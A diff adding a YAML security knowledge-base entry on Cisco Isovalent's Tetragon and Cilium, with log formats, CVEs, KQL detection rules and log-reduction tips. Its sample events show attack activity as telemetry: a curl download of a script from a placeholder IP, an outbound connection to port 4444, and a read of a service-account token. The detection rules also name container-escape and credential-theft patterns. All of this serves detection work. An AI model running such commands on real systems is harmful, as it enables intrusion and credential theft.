@@ -1,0 +1,353 @@
+# Secpedia entry — see CONTRIBUTING.md and schema/entry.schema.json
+id: cisco-isovalent
+name: Cisco Isovalent (Cilium / Tetragon)
+short: Isovalent
+aka:
+  - Isovalent Enterprise for Cilium
+  - Isovalent Runtime Security
+  - Tetragon
+  - Cilium
+  - Hubble
+vendor: Cisco
+category: workload
+status: full
+updated: "2026-11-12"
+contributors:
+  - wlinde
+tags:
+  - kubernetes
+  - ebpf
+  - runtime-security
+  - container
+  - cni
+  - json
+  - process-telemetry
+summary: eBPF-based Kubernetes networking (Cilium), network observability (Hubble) and runtime security (Tetragon), sold by Cisco as Isovalent Enterprise. Tetragon hooks the Linux kernel to emit JSON process exec/exit, network connect and kprobe events enriched with pod, container and workload identity, and it can block actions in the kernel.
+sourcetypes:
+  - st: cisco_isovalent
+    desc: Generic Tetragon / Isovalent Runtime Security events (process_kprobe, process_tracepoint, process_exit …)
+  - st: cisco_isovalent_processconnect
+    desc: Process network connect events with source/destination IP, port and destination pod
+  - st: cisco_isovalent_processexec
+    desc: Process execution events with binary, arguments, ancestry and Kubernetes workload identity
+  - st: cisco:isovalent
+    desc: Splunk Cisco Security Cloud app — generic Isovalent events
+  - st: cisco:isovalent:processExec
+    desc: Splunk Cisco Security Cloud app — process exec events
+  - st: cisco:isovalent:processConnect
+    desc: Splunk Cisco Security Cloud app — process connect events
+facts:
+  First released: Cilium 1.0 (2018); Tetragon open-sourced 2022; Cisco completed the Isovalent acquisition in 2024
+  Platform: Linux kernels with eBPF (BTF); Kubernetes DaemonSet or standalone Linux host agent
+  Delivery model: Open source (CNCF Cilium / Tetragon) + Isovalent Enterprise subscription
+  Deployment modes: Observe-only (tracing policies) or enforce (Sigkill / Override / NotifyEnforcer actions in kernel)
+  Log transport: JSON file (/var/log/tetragon/tetragon.log), export-stdout container, gRPC stream; Splunk HEC via the Cisco Security Cloud app
+  Log format: JSON, one object per line; top-level key names the event type (process_exec, process_kprobe …)
+  Event types: process_exec, process_exit, process_kprobe, process_tracepoint, process_uprobe, process_lsm; Enterprise adds process_connect and friends
+  Typical volume: Hundreds to 10k+ events/s per cluster — dominated by exec/exit of probes, cron jobs and CI pods
+  Cribl Pack: none verified in the Packs Dispensary
+placement:
+  slots:
+    - cloud
+    - internal
+    - endpoint
+  items:
+    - slot: cloud
+      title: Managed Kubernetes (EKS / AKS / GKE)
+      desc: Tetragon runs as a DaemonSet on every worker node; Cilium can replace the cloud CNI or run chained with it. Events carry cluster_name and cloud node labels.
+    - slot: internal
+      title: On-prem Kubernetes / OpenShift
+      desc: Cilium as the CNI enforcing L3–L7 network policy; Tetragon on each node for process and file visibility. Hubble Relay aggregates flow data across nodes.
+    - slot: endpoint
+      title: Bare Linux hosts and VMs
+      desc: Tetragon also runs as a systemd service outside Kubernetes, giving EDR-like exec and kprobe telemetry for Linux servers without the pod fields.
+howItWorks:
+  - title: eBPF in the kernel
+    body: Cilium and Tetragon load eBPF programs into the Linux kernel. Cilium attaches to network hooks (tc, XDP, sockets) to forward and filter packets; Tetragon attaches to process lifecycle hooks, kprobes, tracepoints, uprobes and LSM hooks. Filtering happens in the kernel, so only matching events cross to user space.
+  - title: Process lifecycle and exec_id
+    body: Every exec gets a cluster-wide unique exec_id (base64 of node:ktime:pid) and a parent_exec_id. All later events for that process (connects, kprobes, exit) reference the same exec_id, so a full process tree can be rebuilt from the log stream alone.
+  - title: Kubernetes identity
+    body: The agent watches the Kubernetes API and attaches pod name, namespace, container id and image, pod labels, workload and workload_kind to each event. That turns a PID into "the payments Deployment in prod".
+  - title: TracingPolicy
+    body: A TracingPolicy CRD tells Tetragon which kernel function to hook (e.g. security_file_permission, tcp_connect, security_socket_connect), which arguments to capture, and selectors (paths, binaries, namespaces, capabilities). Matching calls produce process_kprobe events carrying function_name, args, policy_name and action.
+  - title: In-kernel enforcement
+    body: Selectors can carry actions such as Sigkill, Override (change the return value) or NotifyEnforcer. The block happens synchronously in the kernel before the syscall completes, not after a user-space agent reacts.
+  - title: Hubble network observability
+    body: Cilium's Hubble records L3/L4 and L7 (HTTP, DNS, Kafka) flows with pod identities and policy verdicts (FORWARDED / DROPPED). Isovalent Enterprise links these with Tetragon process data so a connection can be traced back to the binary that opened it.
+traffic:
+  handles:
+    - Process exec / exit (all containers and host processes)
+    - Kernel function calls via kprobes / tracepoints / LSM hooks
+    - File access (open, read, write) on sensitive paths
+    - TCP/UDP connect, accept and close per process
+    - Pod-to-pod L3/L4/L7 flows (Cilium / Hubble)
+    - Kubernetes network policy verdicts
+    - Privilege and capability changes (setuid, CAP_SYS_ADMIN)
+  flow:
+    - step: Syscall
+      desc: A process in a pod calls execve, connect or open.
+    - step: eBPF hook
+      desc: Tetragon's eBPF program on that hook runs in the kernel and evaluates the TracingPolicy selectors.
+    - step: Enforce (optional)
+      desc: If a selector matches with Sigkill / Override, the kernel blocks the action right away.
+    - step: Ring buffer
+      desc: Matching events go to user space through a BPF ring buffer, with the exec_id cache added.
+    - step: Enrich
+      desc: The agent adds pod, container, workload, node and cluster metadata from the Kubernetes API.
+    - step: Export
+      desc: Export filters apply, then the event is written as JSON to the log file / stdout, or streamed over gRPC.
+logs:
+  - type: Process exec
+    sourcetype: cisco_isovalent_processexec
+    format: json
+    share: 50–80 %
+    avg: ~2.5 KB
+    desc: One event per execve, with the process and its parent, both with full pod/container context. The largest and most useful event type. Liveness/readiness probes produce a large share of it.
+    key:
+      - process_exec.process.binary
+      - process_exec.process.arguments
+      - process_exec.process.uid
+      - process_exec.parent.binary
+      - process_exec.process.pod.namespace
+      - process_exec.process.pod.name
+      - process_exec.process.pod.container.image.name
+      - node_name
+    noise:
+      - process_exec.process.pod.container.image.id
+      - process_exec.process.pod.pod_labels.pod-template-hash
+      - process_exec.parent.pod.container.image.id
+      - process_exec.parent.pod.pod_labels.pod-template-hash
+      - process_exec.process.docker
+      - process_exec.parent.docker
+      - process_exec.process.auid
+      - process_exec.parent.auid
+    sample: '{"process_exec":{"process":{"exec_id":"aXAtMTAtMC0xMi0zNC5leGFtcGxlLmludGVybmFsOjE4MjczNjQ1NTEyMzQ6NDQyMTA=","pid":44210,"uid":0,"cwd":"/app","binary":"/usr/bin/curl","arguments":"-s http://203.0.113.50/x.sh -o /tmp/x.sh","flags":"execve clone","start_time":"2026-11-12T09:14:22.418203117Z","auid":4294967295,"pod":{"namespace":"payments","name":"checkout-api-7c9f6d5b8d-q2xkp","container":{"id":"containerd://4f1c2a9e7b3d5f60a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718","name":"checkout-api","image":{"id":"registry.example.com/payments/checkout-api@sha256:1111111111111111111111111111111111111111111111111111111111111111","name":"registry.example.com/payments/checkout-api:2.14.0"},"start_time":"2026-11-10T07:02:11Z","pid":38},"pod_labels":{"app":"checkout-api","pod-template-hash":"7c9f6d5b8d"},"workload":"checkout-api","workload_kind":"Deployment"},"docker":"4f1c2a9e7b3d5f60a1b2c3d4e5f6071","parent_exec_id":"aXAtMTAtMC0xMi0zNC5leGFtcGxlLmludGVybmFsOjE4MjczNjQ0OTg3NjU6NDQyMDE=","tid":44210,"in_init_tree":false},"parent":{"exec_id":"aXAtMTAtMC0xMi0zNC5leGFtcGxlLmludGVybmFsOjE4MjczNjQ0OTg3NjU6NDQyMDE=","pid":44201,"uid":0,"cwd":"/app","binary":"/bin/sh","arguments":"-c \"curl -s http://203.0.113.50/x.sh -o /tmp/x.sh\"","flags":"execve clone","start_time":"2026-11-12T09:14:22.391447820Z","auid":4294967295,"pod":{"namespace":"payments","name":"checkout-api-7c9f6d5b8d-q2xkp","container":{"id":"containerd://4f1c2a9e7b3d5f60a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718","name":"checkout-api","image":{"id":"registry.example.com/payments/checkout-api@sha256:1111111111111111111111111111111111111111111111111111111111111111","name":"registry.example.com/payments/checkout-api:2.14.0"},"start_time":"2026-11-10T07:02:11Z","pid":38},"pod_labels":{"app":"checkout-api","pod-template-hash":"7c9f6d5b8d"},"workload":"checkout-api","workload_kind":"Deployment"},"docker":"4f1c2a9e7b3d5f60a1b2c3d4e5f6071","parent_exec_id":"aXAtMTAtMC0xMi0zNC5leGFtcGxlLmludGVybmFsOjE4MjczNjQ0MTIzNDU6NDQxOTA=","tid":44201,"in_init_tree":false}},"node_name":"ip-10-0-12-34.example.internal","time":"2026-11-12T09:14:22.418201904Z","cluster_name":"prod-eu-1"}'
+  - type: Process connect
+    sourcetype: cisco_isovalent_processconnect
+    format: json
+    share: 10–30 %
+    avg: ~1.8 KB
+    desc: Emitted when a process opens a TCP/UDP connection. Carries the 5-tuple plus the process and, for in-cluster targets, the destination pod and workload.
+    key:
+      - process_connect.process.binary
+      - process_connect.source_ip
+      - process_connect.destination_ip
+      - process_connect.destination_port
+      - process_connect.protocol
+      - process_connect.process.pod.namespace
+      - process_connect.process.pod.name
+    noise:
+      - process_connect.sock_cookie
+      - process_connect.process.auid
+      - process_connect.parent.auid
+      - process_connect.process.pod.container.image.id
+    sample: '{"process_connect":{"process":{"exec_id":"aXAtMTAtMC0xMi0zNC5leGFtcGxlLmludGVybmFsOjE4Mjc0MDAxMjM0NTY6NDQ1MDI=","pid":44502,"uid":1000,"cwd":"/tmp","binary":"/tmp/kworkerd","arguments":"","flags":"execve clone","start_time":"2026-11-12T09:15:03.120044911Z","auid":4294967295,"pod":{"namespace":"payments","name":"checkout-api-7c9f6d5b8d-q2xkp","container":{"id":"containerd://4f1c2a9e7b3d5f60a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718","name":"checkout-api","image":{"id":"registry.example.com/payments/checkout-api@sha256:1111111111111111111111111111111111111111111111111111111111111111","name":"registry.example.com/payments/checkout-api:2.14.0"},"pid":61},"workload":"checkout-api","workload_kind":"Deployment"},"parent_exec_id":"aXAtMTAtMC0xMi0zNC5leGFtcGxlLmludGVybmFsOjE4MjczNjQ0OTg3NjU6NDQyMDE=","tid":44502,"in_init_tree":false},"parent":{"exec_id":"aXAtMTAtMC0xMi0zNC5leGFtcGxlLmludGVybmFsOjE4MjczNjQ0OTg3NjU6NDQyMDE=","pid":44201,"uid":0,"cwd":"/app","binary":"/bin/sh","arguments":"-c /tmp/kworkerd","flags":"execve clone","auid":4294967295,"tid":44201},"source_ip":"10.0.12.88","source_port":51874,"destination_ip":"198.51.100.77","destination_port":4444,"sock_cookie":"18446623172910345216","protocol":"TCP"},"node_name":"ip-10-0-12-34.example.internal","time":"2026-11-12T09:15:03.884210377Z","cluster_name":"prod-eu-1"}'
+  - type: Process kprobe (TracingPolicy hit)
+    sourcetype: cisco_isovalent
+    format: json
+    share: 5–20 %
+    avg: ~1.5 KB
+    desc: A kernel function matched a TracingPolicy, e.g. a read of a service-account token or /etc/shadow, a mount, or a capability change. Low volume, high value. action shows whether it was only logged (KPROBE_ACTION_POST) or blocked (SIGKILL / OVERRIDE).
+    key:
+      - process_kprobe.function_name
+      - process_kprobe.policy_name
+      - process_kprobe.args[0].file_arg.path
+      - process_kprobe.action
+      - process_kprobe.process.binary
+      - process_kprobe.process.pod.namespace
+      - process_kprobe.process.pod.name
+    noise:
+      - process_kprobe.process.auid
+      - process_kprobe.parent.auid
+      - process_kprobe.process.flags
+    sample: '{"process_kprobe":{"process":{"exec_id":"aXAtMTAtMC0xMi0zNC5leGFtcGxlLmludGVybmFsOjE4Mjc0MTIzNDU2Nzg6NDQ2MTE=","pid":44611,"uid":0,"cwd":"/app","binary":"/bin/cat","arguments":"/var/run/secrets/kubernetes.io/serviceaccount/token","flags":"execve clone","start_time":"2026-11-12T09:16:40.552310004Z","auid":4294967295,"pod":{"namespace":"payments","name":"checkout-api-7c9f6d5b8d-q2xkp","container":{"id":"containerd://4f1c2a9e7b3d5f60a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718","name":"checkout-api","image":{"name":"registry.example.com/payments/checkout-api:2.14.0"}},"workload":"checkout-api","workload_kind":"Deployment"},"parent_exec_id":"aXAtMTAtMC0xMi0zNC5leGFtcGxlLmludGVybmFsOjE4MjczNjQ0OTg3NjU6NDQyMDE=","tid":44611},"parent":{"exec_id":"aXAtMTAtMC0xMi0zNC5leGFtcGxlLmludGVybmFsOjE4MjczNjQ0OTg3NjU6NDQyMDE=","pid":44201,"uid":0,"binary":"/bin/sh","auid":4294967295},"function_name":"security_file_permission","args":[{"file_arg":{"path":"/run/secrets/kubernetes.io/serviceaccount/..2026_11_10_07_02_11.123456789/token","permission":"-rw-r--r--"}},{"int_arg":4}],"return":{"int_arg":0},"action":"KPROBE_ACTION_POST","policy_name":"sensitive-files","return_action":"KPROBE_ACTION_POST"},"node_name":"ip-10-0-12-34.example.internal","time":"2026-11-12T09:16:40.553018221Z","cluster_name":"prod-eu-1"}'
+cves:
+  - id: CVE-2026-65960
+    cvss: 8.8
+    year: 2026
+    kev: false
+    scope: device
+    title: Tetragon gRPC admin API exposed unauthenticated on localhost:54321 to hostNetwork pods (CNA score; NVD has not scored it)
+    affected: Tetragon before 1.7.0 using the Helm default TCP gRPC listener
+    fixed: 1.7.0 (default changed to a Unix-domain socket)
+    detect: process_connect (or a security_socket_connect kprobe) to 127.0.0.1:54321 from a process that is not tetra / the Tetragon agent, especially from a hostNetwork pod; unexpected TracingPolicy deletions or changes in Kubernetes audit logs.
+    avoid: Upgrade to 1.7.0; set tetragon.grpc.address to a unix:// socket or disable gRPC; restrict hostNetwork pods with admission policy; apply the vendor's blocking TracingPolicy until patched.
+  - id: CVE-2026-49445
+    cvss: 8.8
+    year: 2026
+    kev: false
+    scope: device
+    title: Cilium L7 Envoy creates a world-accessible admin.sock — TLS secret exposure and traffic disruption
+    affected: Cilium < 1.17.14, 1.18.0–1.18.7, 1.19.0–1.19.1 with L7 functionality enabled (embedded or standalone Envoy)
+    fixed: 1.17.14, 1.18.8, 1.19.2
+    detect: process_kprobe / process_connect events where a binary other than cilium-envoy opens the Envoy admin socket on the node; curl or socat in host or privileged pods against /var/run/cilium/envoy/sockets.
+    avoid: Upgrade; limit who can run privileged or hostPath pods on nodes; watch the socket path with a TracingPolicy.
+  - id: CVE-2023-39347
+    cvss: 9
+    year: 2023
+    kev: false
+    scope: device
+    title: Pod label update lets an attacker make Cilium apply the wrong network policy (policy bypass)
+    affected: Cilium before 1.12.14, 1.13.x before 1.13.7, 1.14.x before 1.14.2
+    fixed: 1.12.14, 1.13.7, 1.14.2
+    detect: Kubernetes audit logs showing pod label patches that set io.cilium.k8s.* or namespace-style labels; Hubble flows suddenly FORWARDED between workloads that were previously DROPPED.
+    avoid: Upgrade; restrict who can update pod labels (RBAC on pods/patch); admission policy forbidding io.cilium.k8s.policy.* labels.
+  - id: CVE-2024-21626
+    cvss: 8.6
+    year: 2024
+    kev: false
+    scope: traffic
+    title: runc "Leaky Vessels" file-descriptor leak → container escape — the workload Tetragon watches
+    affected: runc 1.0.0-rc93 through 1.1.11 (containerd / Docker / CRI-O nodes using runc)
+    fixed: runc 1.1.12
+    detect: process_exec where process.cwd starts with /proc/self/fd/ or the binary runs from a host path from inside a container; kprobes on host binaries written by a container pid.
+    avoid: Patch runc on every node; block untrusted images; Tetragon policy killing exec with a cwd under /proc/self/fd.
+  - id: CVE-2024-1086
+    cvss: 7.8
+    year: 2024
+    kev: true
+    scope: traffic
+    title: Linux kernel nf_tables use-after-free → local root — the node kernel Cilium/Tetragon run on
+    affected: Linux kernels with nf_tables that lack fix commit f342de4e2f33 (backported to stable trees in early 2024)
+    detect: process_exec of unknown binaries from /tmp in a pod followed by uid changing to 0; kprobes on commit_creds / setuid from a non-root container process; unshare / user-namespace creation from workloads.
+    avoid: Patch node kernels; disable unprivileged user namespaces; seccomp RuntimeDefault for all pods.
+detections:
+  - title: Download-and-execute inside a container
+    severity: high
+    signals:
+      - process_exec binary = curl / wget
+      - arguments contain http:// to an external IP
+      - followed by exec from /tmp
+    why: Production containers rarely fetch and run scripts. This is the usual first step after an RCE in an app pod.
+    kql: |-
+      dataset="isovalent_tetragon"
+      | where isnotempty(process_exec.process.pod.namespace)
+      | where process_exec.process.binary endswith "/curl" or process_exec.process.binary endswith "/wget"
+      | where process_exec.process.arguments matches regex "https?://[0-9.]+"
+      | summarize n=count(), args=make_set(process_exec.process.arguments) by process_exec.process.pod.namespace, process_exec.process.pod.name, node_name
+    mitre:
+      - T1105
+      - T1059.004
+  - title: Interactive shell spawned in a pod (kubectl exec)
+    severity: medium
+    signals:
+      - process_exec binary = sh / bash
+      - parent binary = runc / containerd-shim
+      - in_init_tree = false
+    why: Shells that are not descendants of the container's init came in through exec. Fine for break-glass debugging, suspicious in production namespaces.
+    kql: |-
+      dataset="isovalent_tetragon"
+      | where process_exec.process.binary in ("/bin/sh","/bin/bash","/usr/bin/bash","/bin/ash")
+      | where process_exec.process.in_init_tree == false
+      | where process_exec.process.pod.namespace !in ("kube-system","debug")
+      | summarize n=count() by process_exec.process.pod.namespace, process_exec.process.pod.name, process_exec.parent.binary
+    mitre:
+      - T1609
+      - T1059.004
+  - title: Service-account token or credential file read by unexpected binary
+    severity: high
+    signals:
+      - process_kprobe function_name = security_file_permission
+      - path contains serviceaccount/token or /etc/shadow
+      - binary not in the app allow-list
+    why: Stealing the pod's Kubernetes token is how attackers pivot from one pod to the API server.
+    kql: |-
+      dataset="isovalent_tetragon"
+      | where process_kprobe.function_name == "security_file_permission"
+      | where process_kprobe.args[0].file_arg.path contains "serviceaccount" or process_kprobe.args[0].file_arg.path contains "/etc/shadow"
+      | where process_kprobe.process.binary in ("/bin/cat","/usr/bin/cat","/usr/bin/base64","/usr/bin/curl")
+      | summarize n=count() by process_kprobe.process.pod.namespace, process_kprobe.process.pod.name, process_kprobe.process.binary
+    mitre:
+      - T1528
+      - T1552.001
+  - title: Outbound connection to a non-standard port from a workload
+    severity: high
+    signals:
+      - process_connect destination_ip outside RFC1918
+      - destination_port not in 80/443/53
+      - binary in /tmp or unknown
+    why: Reverse shells and miners connect out on 4444, 3333, 14444 etc. The process field shows which binary did it — something a flow log cannot tell you.
+    kql: |-
+      dataset="isovalent_tetragon"
+      | where isnotempty(process_connect.destination_ip)
+      | where not(ipv4_is_private(process_connect.destination_ip))
+      | where process_connect.destination_port !in (80, 443, 53)
+      | summarize n=count(), ports=make_set(process_connect.destination_port) by process_connect.process.binary, process_connect.process.pod.name, process_connect.destination_ip
+    mitre:
+      - T1571
+      - T1071
+  - title: Container escape tooling (nsenter / mount / chroot to host)
+    severity: critical
+    signals:
+      - process_exec binary = nsenter / mount / chroot
+      - arguments reference /proc/1 or /host
+      - pod is not a system DaemonSet
+    why: nsenter -t 1 or mounting the host filesystem from a pod is a direct break-out to the node.
+    kql: |-
+      dataset="isovalent_tetragon"
+      | where process_exec.process.binary endswith "/nsenter" or process_exec.process.binary endswith "/chroot" or (process_exec.process.binary endswith "/mount" and process_exec.process.arguments contains "/host")
+      | where process_exec.process.pod.namespace != "kube-system"
+      | project _time, node_name, process_exec.process.pod.name, process_exec.process.binary, process_exec.process.arguments
+    mitre:
+      - T1611
+  - title: Pod reaching the cloud metadata endpoint
+    severity: medium
+    signals:
+      - process_connect destination_ip = 169.254.169.254
+      - workload without a cloud-SDK role
+    why: Instance-metadata credentials give the node's IAM role. Pods should use IRSA / Workload Identity, not the node role.
+    kql: |-
+      dataset="isovalent_tetragon"
+      | where process_connect.destination_ip == "169.254.169.254"
+      | summarize n=count() by process_connect.process.pod.namespace, process_connect.process.pod.name, process_connect.process.binary
+    mitre:
+      - T1552.005
+optimizations:
+  - title: Drop health-probe execs at the source or in Stream
+    saving: 30–60 %
+    fn: Drop
+    how: Kubelet liveness/readiness probes exec the same binary every few seconds in every pod. Tetragon's health_check export filter or a Stream Drop on maybe_exec_probe removes them before they cost anything.
+    expr: process_exec && process_exec.process.pod && process_exec.process.pod.container && process_exec.process.pod.container.maybe_exec_probe === true
+  - title: Remove duplicated parent pod block and image digests
+    saving: 25–40 %
+    fn: Eval
+    how: The parent usually runs in the same pod, so parent.pod repeats process.pod field for field. Keep parent.binary, parent.arguments and parent.exec_id; remove parent.pod, image.id digests, docker (a truncated copy of the container id) and auid.
+    expr: "remove: process_exec.parent.pod, *.image.id, *.docker, *.auid"
+  - title: Drop process_exit, keep exec
+    saving: 20–40 %
+    fn: Drop
+    how: Each exec has a matching exit. Unless you need process duration or exit codes, drop exits (or aggregate them) and keep only exec plus kprobe hits.
+    expr: __e.process_exit !== undefined
+  - title: Aggregate kube-system and node-agent connects
+    saving: 10–25 %
+    fn: Aggregations
+    how: kubelet, CNI and monitoring agents open thousands of short connections to the API server and metrics endpoints. Roll them up to counts per binary/destination per minute; keep raw for application namespaces.
+    expr: process_connect && process_connect.process.pod && process_connect.process.pod.namespace === 'kube-system'
+  - title: Route by event type
+    saving: SIEM licence
+    fn: Routes
+    how: process_kprobe hits and enforcement actions go to the SIEM at full fidelity. Exec and connect go to Cribl Lake raw plus the SIEM after the trims above.
+    expr: process_kprobe → SIEM  |  process_exec, process_connect → Lake + SIEM(optimised)
+references:
+  - title: Tetragon — Events (JSON export, export and field filters)
+    url: https://tetragon.io/docs/concepts/events/
+  - title: Tetragon — gRPC API / event reference
+    url: https://tetragon.io/docs/reference/grpc-api/
+  - title: Splunk Security Content — Cisco Isovalent Process Exec data source
+    url: https://research.splunk.com/sources/87654321-dcba-4321-00fe-0987654321ba/
+  - title: GHSA-6qqg-3qf7-p3v5 — Tetragon unauthenticated gRPC API (CVE-2026-65960)
+    url: https://github.com/cilium/tetragon/security/advisories/GHSA-6qqg-3qf7-p3v5
+  - title: GHSA-3fcv-jvfp-m4q9 — Cilium Envoy admin socket (CVE-2026-49445)
+    url: https://github.com/cilium/cilium/security/advisories/GHSA-3fcv-jvfp-m4q9
+  - title: GHSA-gj2r-phwg-6rww — Cilium pod-label policy bypass (CVE-2023-39347)
+    url: https://github.com/cilium/cilium/security/advisories/GHSA-gj2r-phwg-6rww
+  - title: runc GHSA-xr7r-f8xq-vfvv (CVE-2024-21626)
+    url: https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv
+  - title: CISA Known Exploited Vulnerabilities catalog
+    url: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
+related:
+  - falco
+  - aws-eks-audit
+  - linux-auditd
+  - sysmon
+  - crowdstrike
